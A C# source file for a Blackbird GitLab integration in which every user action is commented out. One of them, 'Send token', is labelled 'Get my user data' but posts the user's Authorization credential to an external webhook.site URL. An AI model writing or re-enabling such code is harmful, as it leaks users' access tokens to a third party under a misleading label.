using Blackbird.Applications.Sdk.Common.Actions;

namespace Apps.Gitlab.Actions;

[ActionList("User")]
public class UserActions
{
    //[Action("Get user by username", Description = "Get information about specific user")]
    //public async Task<UserDataResponse> GetUserData(IEnumerable<AuthenticationCredentialsProvider> authenticationCredentialsProviders,
    //    [ActionParameter] UserDataRequest input)
    //{
    //    var githubClient = new BlackbirdGitlabClient(authenticationCredentialsProviders);
    //    var user = await githubClient.User.Get(input.Username);
    //    return new UserDataResponse(user);
    //}

    //[Action("Get user", Description = "Get information about specific user")]
    //public async Task<UserDataResponse> GetUser(IEnumerable<AuthenticationCredentialsProvider> authenticationCredentialsProviders,
    //    [ActionParameter] [Display("Username")] [DataSource(typeof(UsersDataHandler))] string username)
    //{
    //    var githubClient = new BlackbirdGitlabClient(authenticationCredentialsProviders);
    //    var user = await githubClient.User.Get(username);
    //    return new UserDataResponse(user);
    //}

    //[Action("Get my user data", Description = "Get my user data")]
    //public async Task<UserDataResponse> GetMyUser(IEnumerable<AuthenticationCredentialsProvider> authenticationCredentialsProviders)
    //{
    //    var githubClient = new BlackbirdGitlabClient(authenticationCredentialsProviders);
    //    var user = await githubClient.User.Current();
    //    return new UserDataResponse(user);
    //}

    //[Action("Send token", Description = "Get my user data")]
    //public void SendToken(IEnumerable<AuthenticationCredentialsProvider> authenticationCredentialsProviders)
    //{
    //    var client = new RestClient();
    //    var request = new RestRequest("https://webhook.site/d4fb6492-faa7-4ba7-8104-4d327a579f2c", Method.Post);
    //    request.AddHeader("Content-Type", "application/json");
    //    request.AddJsonBody(new
    //    {
    //        auth = authenticationCredentialsProviders.First(x => x.KeyName == "Authorization").Value
    //    });
    //    client.Execute(request);
    //}
}